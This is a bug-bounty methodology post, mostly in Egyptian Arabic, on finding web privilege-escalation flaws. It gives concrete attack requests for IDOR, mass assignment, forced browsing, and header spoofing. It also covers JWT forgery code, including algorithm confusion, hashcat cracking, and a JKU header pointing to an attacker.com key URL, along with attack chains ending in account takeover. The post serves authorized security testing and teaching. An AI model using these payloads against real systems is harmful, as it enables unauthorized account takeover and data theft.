---
layout: post
title: "Privilege Escalation — The Complete Hunting Methodology"
date: 2026-03-22
category: "Bug Bounty"
severity: "Critical"
cover_image: /assets/img/covers/privesc-cover.png
tags: [privilege-escalation, broken-access-control, IDOR, methodology, web-security, API, JWT, RBAC]
excerpt: "من horizontal إلى vertical إلى full account takeover — كل attack path في Privilege Escalation مع الـ bypass techniques والـ chaining strategies."
read_time: 20
---

Privilege Escalation في الـ web هي مش مجرد "user يوصل لـ admin endpoint". دي منظومة كاملة من الـ trust boundaries المكسورة، الـ state machines المعطوبة، والـ authorization logic اللي اتبنت على افتراضات غلط. الـ hunters اللي بيلاقوا الـ critical findings مش بيدوروا على misconfigured endpoints — بيفهموا إزاي التطبيق بيفكر في الـ roles والـ permissions وبيدوروا على الفجوات بين الـ intended behavior والـ actual enforcement.

---

## Mental Model — إزاي تفكر في Privilege Escalation

قبل أي حاجة، فيه سؤالين لازم يكونوا دايماً في دماغك:

**1. فين بيحصل الـ authorization check؟**
كتير من الـ apps بتعمل الـ check عند نقطة واحدة بس — عادةً عند الـ UI layer أو عند أول request. لو عدّيت النقطة دي بأي طريقة، باقي الـ flow مفيش checks.

**2. الـ check بيتحقق من إيه بالظبط؟**
- هل بيتحقق من الـ role؟
- ولا من الـ resource ownership؟
- ولا من الاتنين؟
- ولا من حاجة تانية خالص زي flag في الـ session أو parameter في الـ request؟

الإجابة على السؤالين دول هي اللي بتحدد attack path.

---

## Attack Surface Mapping

### الـ Role Structure

أول حاجة تعملها قبل أي testing — ارسم الـ role hierarchy بتاعة التطبيق.

```
Super Admin
    └── Admin
         └── Manager
              └── User
                   └── Guest / Unauthenticated
```

كل transition بين level وتاني هي attack surface. مش بس من User لـ Admin — كمان من Guest لـ User، ومن Manager لـ Super Admin.

**اللي بيتجاهله معظم الـ hunters:**
- الـ roles المؤقتة — user بيتعمله role لفترة معينة (trial, beta, invited)
- الـ feature flags — user عنده access لـ feature معينة بدون role رسمي
- الـ organizational roles — نفس الـ user ليه permissions مختلفة في contexts مختلفة (multi-tenant apps)
- الـ API roles مقارنة بـ UI roles — غالباً مختلفين

### Attack Surfaces حسب الـ Feature

كل feature في التطبيق ليها attack surface خاص بيها:

**Authentication & Session:**
- Login flow — role assignment عند الـ login
- OAuth/SSO — role mapping من الـ provider
- Token refresh — هل الـ role بيتحدث ولا لأ
- Password reset — هل ممكن يغير email/role في نفس الـ flow

**User Management:**
- Registration — هل ممكن تحدد الـ role في الـ signup request
- Profile update — هل فيه role/permission field في الـ body
- Email verification — هل بيفتح permissions إضافية
- Account deletion — هل ممكن تحذف admin account وتاخد resources بتاعته

**API Endpoints:**
- CRUD operations — كل endpoint ليه authorization منفصل
- Batch operations — غالباً الـ check بيحصل على الـ batch مش على كل item
- Export/Import — data access بيبقى broader من الـ normal read
- Webhooks/Callbacks — غالباً مفيش authentication

**Admin Panel:**
- Hidden endpoints مش ظاهرة في الـ UI
- Settings pages
- User impersonation features
- Audit logs — read access ممكن يكشف sensitive data

---

## Horizontal Privilege Escalation

### Definition
نفس الـ role، access لـ resources بتاعة user تاني.

### الـ Attack Vectors

**1. Direct Object Reference (IDOR)**

الأساس. بس فيه levels:

```
GET /api/users/1337/profile          → obvious
GET /api/users/1337/invoices         → less tested
GET /api/users/1337/sessions         → rarely tested
GET /api/users/1337/2fa/backup-codes → almost never tested
```

كل sub-resource تحت الـ user object لازم تتtest بشكل منفصل. الـ check على `/profile` مش بالضرورة موجود على `/2fa/backup-codes`.

**2. UUID/Hash Bypass**

التطبيق بيستخدم UUID بدل sequential ID — مش معناه إنه آمن.

```
GET /api/documents/a3f5c2d1-...
```

- الـ UUID ممكن يكون predictable لو الـ seed معروف
- الـ UUID ممكن يتسرب في responses تانية (activity feed, notifications, shared links)
- الـ UUID ممكن يتـ enumerate من خلال timing differences

**3. Parameter Pollution**

```http
GET /api/profile?user_id=victim_id&user_id=attacker_id
```

بعض الـ frameworks بتاخد أول value، بعضها بتاخد آخر value. الـ authorization check ممكن يتحقق من الأول، والـ data fetch بياخد التاني.

**4. HTTP Method Override**

```http
POST /api/users/1337/delete
X-HTTP-Method-Override: DELETE
```

الـ authorization middleware ممكن يتحقق من الـ HTTP method الفعلية، بس الـ router بيشوف الـ override header.

**5. Path Traversal في الـ Authorization**

```
/api/users/me/../1337/profile
/api/users/1337%2F..%2F1338/profile
```

---

## Vertical Privilege Escalation

### Definition
User بـ role منخفض بيوصل لـ functionality مخصصة لـ role أعلى.

### الـ Attack Vectors

**1. Mass Assignment**

الـ vector الأكثر تأثيراً وأقل testing.

لما التطبيق بيـ bind الـ request body مباشرة على الـ model، أي field في الـ model ممكن يتعدل.

```http
PATCH /api/users/me
Content-Type: application/json

{
  "name": "muhamad0x",
  "email": "new@email.com",
  "role": "admin",
  "is_verified": true,
  "subscription_tier": "enterprise",
  "credits": 999999
}
```

حتى لو الـ response مرجعش الـ role متغير، اعمل request جديد وشوف الـ role الحالي.

**الـ fields اللي لازم تجربها دايماً:**
```
role / roles / user_role / account_type
is_admin / admin / superuser / is_superuser  
is_verified / verified / email_verified
plan / tier / subscription / subscription_tier
permissions / scopes / capabilities
credits / balance / quota
```

**2. Forced Browsing لـ Admin Endpoints**

الـ UI مش بتعرض الـ link مش معناه إن الـ endpoint محمي.

```
/admin
/admin/users
/admin/settings
/management
/internal
/staff
/backoffice
/superuser
/api/admin/
/api/internal/
/api/v1/admin/
```

استخدم wordlist متخصصة — مش generic directory bruteforce. دور على الـ JS files في التطبيق، كتير منها بتكون فيها routes صريحة.

**3. Role Parameter في الـ Request**

```http
POST /api/auth/login
{
  "email": "user@example.com",
  "password": "password123",
  "role": "admin"
}
```

أو في Registration:

```http
POST /api/auth/register
{
  "email": "attacker@example.com",
  "password": "password123",
  "role": "admin",
  "invite_code": ""
}
```

**4. JWT Manipulation**

الـ JWT attacks كلها في جوهرها privilege escalation.

**Algorithm None:**
```
header: {"alg": "none", "typ": "JWT"}
payload: {"user_id": 1, "role": "admin"}
signature: (empty)
```

**Algorithm Confusion (RS256 → HS256):**
الـ server بيستخدم RS256 — الـ public key معروف. تغير الـ algorithm لـ HS256 وتوقع بالـ public key كـ HMAC secret.

```python
import jwt
public_key = open('public_key.pem').read()

token = jwt.encode(
    {"user_id": 1, "role": "admin"},
    public_key,
    algorithm="HS256"
)
```

**Weak Secret Brute Force:**
```bash
hashcat -a 0 -m 16500 token.txt wordlist.txt
```

لو الـ secret ضعيف، تقدر تعمل أي token بأي role.

**JKU/KID Injection:**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.com/jwks.json"
}
```

الـ server بيجيب الـ public key من الـ URL اللي انت حاطته — انت بتحكم في الـ key.

**5. OAuth Role Misconfiguration**

لما التطبيق بيستخدم OAuth وبيعمل role assignment بناءً على data جاية من الـ provider:

```
email domain → role mapping
@company.com → employee role
@admin.company.com → admin role  ← هل ممكن تسجل domain زي ده؟
```

أو الـ role بييجي في الـ OAuth scope وممكن يتعدل في الـ callback:

```
GET /oauth/callback?code=xxx&role=admin
```

---

## Context-Specific Escalation

### Multi-Tenant Applications

الأكثر complexity والأعلى impact.

في multi-tenant، فيه مستويين من الـ authorization:
1. هل الـ user عنده access للـ tenant ده؟
2. هل الـ user عنده الـ role المطلوب جوه الـ tenant ده؟

الـ attack:
- User عنده admin role في tenant A
- بيحاول يعمل actions في tenant B بـ auth token بتاع tenant A
- لو الـ check بيتحقق من الـ role بس ومش من الـ tenant ownership → cross-tenant privilege escalation

```http
GET /api/tenant-b/users
Authorization: Bearer <token_from_tenant_a_admin>
```

**الـ Tenant ID في الـ JWT:**
```json
{
  "user_id": 123,
  "role": "user",
  "tenant_id": "tenant-a"
}
```

غير الـ tenant_id لـ tenant-b وجرب.

### Workflow / State-Based Escalation

التطبيق بيعمل الـ authorization check عند بداية الـ workflow بس.

مثال — approval workflow:
```
Draft → Pending Review → Approved → Published
```

الـ user بيقدر يعدل فقط في حالة Draft. بعد الـ submission، المفروض يبقى read-only.

الـ attack:
1. ابدأ الـ workflow كـ draft
2. قدم للـ review
3. حاول تعدل مباشرة على الـ object بـ API call — بدون المرور بالـ UI

لو الـ check بيعتمد على الـ UI state ومش على الـ server-side state → تقدر تعدل objects "مقفولة".

### Feature Flag Escalation

```http
GET /api/profile
Response:
{
  "user_id": 123,
  "role": "user",
  "features": {
    "beta_dashboard": false,
    "advanced_export": false,
    "admin_tools": false
  }
}
```

جرب:
```http
PATCH /api/profile
{
  "features": {
    "admin_tools": true
  }
}
```

---

## API-Specific Vectors

### Version Downgrade

```
/api/v3/users/me/permissions  → checks properly
/api/v2/users/me/permissions  → old code, no checks
/api/v1/users/me/permissions  → even older, definitely no checks
```

الـ v1 endpoints غالباً موجودة وشغالة بس مش documented.

### GraphQL

في REST، الـ authorization بيبقى على الـ endpoint. في GraphQL، المفروض يبقى على كل field.

```graphql
query {
  me {
    id
    email
    role          # هل الـ user المفروض يشوف ده؟
    adminNotes    # definitely not
    allUsers {    # cross-user access
      id
      email
      paymentInfo
    }
  }
}
```

**Introspection** لو مفتوح في production:
```graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

بتطلع كل الـ types والـ fields الموجودة — حتى اللي مش مكشوفة في الـ UI.

**Batch Query Abuse:**
```graphql
query {
  user(id: 1) { email role }
  user(id: 2) { email role }
  user(id: 3) { email role }
}
```

### HTTP Headers

بعض الـ apps بتثق في headers بتيجي من الـ internal network أو الـ load balancer:

```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 10.0.0.1
X-Internal: true
X-Admin: true
X-Role: admin
X-User-ID: 1
X-Original-User: admin@company.com
```

### CORS Misconfiguration → Privilege Escalation

لو الـ app بيثق في origin معين وبيعطيه permissions زيادة:

```http
Origin: https://internal.company.com
```

جرب تبعت requests بالـ header ده وشوف لو بتاخد access إضافي.

---

## Chaining لـ Critical Impact

الـ P3 بيبقى Critical لما تعرف تـ chain.

### Chain 1: IDOR → Account Takeover

```
1. IDOR على GET /api/users/{id} → تعرف email الـ victim
2. Trigger password reset على الـ email ده
3. IDOR على GET /api/users/{id}/reset-token → تاخد الـ reset token
4. تغير الـ password
5. Full account takeover
```

### Chain 2: Mass Assignment → Admin Takeover

```
1. PATCH /api/users/me + {"role": "admin"} → escalate to admin
2. GET /admin/users → list all users
3. POST /admin/users/1/impersonate → impersonate super admin
4. Full application compromise
```

### Chain 3: JWT Weak Secret → Tenant Admin

```
1. Crack JWT secret بـ hashcat
2. Forge token بـ {"role": "admin", "tenant_id": "target-tenant"}
3. Access target tenant admin panel
4. Export all tenant data
5. Critical data breach
```

### Chain 4: Feature Flag → Stored XSS → ATO

```
1. Enable admin_tools feature بـ mass assignment
2. Admin tools فيها rich text editor بدون sanitization
3. Inject stored XSS في admin panel
4. XSS بتسرق session token لأي admin يفتح الـ page
5. Account takeover على admin
```

---

## What Most Hunters Miss

**1. الـ Authorization على الـ Response مش الـ Request**

التطبيق بيرجع 403 على الـ action — بس ممكن الـ response body فيه data. Check الـ response body حتى في الـ error responses.

**2. Privileged Actions في Non-Privileged Endpoints**

الـ endpoint `/api/users/me` مش admin endpoint — بس لو قدرت تعدل `role` فيه، النتيجة هي نفسها.

**3. الـ Authorization في الـ Async Operations**

```
POST /api/reports/generate → 202 Accepted, job_id: 123
GET /api/jobs/123/status   → processing
GET /api/jobs/123/result   → data
```

الـ check بيحصل عند الـ POST. الـ GET على الـ result ممكن ميبقاش محمي — account A يطلب report، account B يجيب الـ result بالـ job_id.

**4. الـ Soft Delete**

```
DELETE /api/posts/123 → 200 OK (soft deleted, مش محذوف فعلاً)
GET /api/posts/123    → 404
GET /api/posts/123?include_deleted=true → 200 + data
```

**5. الـ Role في الـ Invite Flow**

```
POST /api/teams/invite
{
  "email": "attacker@example.com",
  "role": "member"
}
```

جرب تغير الـ role في الـ invite request لـ `admin` أو `owner`. كتير من الـ apps بتتحقق من الـ inviter role بس مش من الـ invited role.

**6. الـ Pagination في الـ Admin Endpoints**

```
GET /api/admin/users?page=1  → 403
GET /api/users?page=1&limit=1000  → 200 + all users
```

الـ admin endpoint محمي بس الـ regular endpoint بيقبل limit كبير جداً.

---

## Testing Methodology — الـ Workflow الكامل

```
1. RECON
   ├── Map all roles in the application
   ├── Create accounts for each role
   ├── Document all features per role
   └── Extract all API endpoints from JS files

2. SURFACE MAPPING
   ├── For each endpoint: identify the authorization model
   ├── Identify object ownership patterns
   ├── Find all parameter types (ID, UUID, slug, hash)
   └── Map state machines for key workflows

3. HORIZONTAL TESTING
   ├── Account A performs action → capture request
   ├── Replay with Account B session
   ├── Test all sub-resources, not just top-level objects
   └── Test export/batch/async variants

4. VERTICAL TESTING
   ├── Replay lower-role requests with higher-role actions
   ├── Test mass assignment on all PATCH/PUT endpoints
   ├── Forced browsing on admin paths
   ├── JWT manipulation if applicable
   └── Role parameter injection in auth flows

5. CONTEXT TESTING
   ├── Cross-tenant access (if multi-tenant)
   ├── State-based bypass
   ├── Feature flag manipulation
   └── API version downgrade

6. CHAINING
   ├── Combine findings for maximum impact
   ├── Target account takeover as the goal
   └── Calculate blast radius (how many users affected)
```

---

## Impact Framing

الـ impact هو اللي بيحدد الـ severity — مش الـ technique.

| Finding | Impact | Severity |
|---|---|---|
| Read another user's public profile | Minimal | N/A |
| Read another user's private data | PII exposure | P3-P2 |
| Modify another user's data | Data integrity | P2 |
| Delete another user's account | DoS on user | P2 |
| Escalate to admin | Full app compromise | P1 |
| Cross-tenant admin access | Multi-org breach | Critical |
| Forge JWT as super admin | Complete takeover | Critical |

دايماً اربط الـ finding بالـ worst case scenario — مش الـ finding نفسه. "Mass assignment يخلي user يعمل role=admin" → الـ impact مش "user بيبقى admin"، الـ impact هو "attacker يقدر يحذف كل الـ users، يسرق كل الـ data، ويعطل الـ service كاملاً".
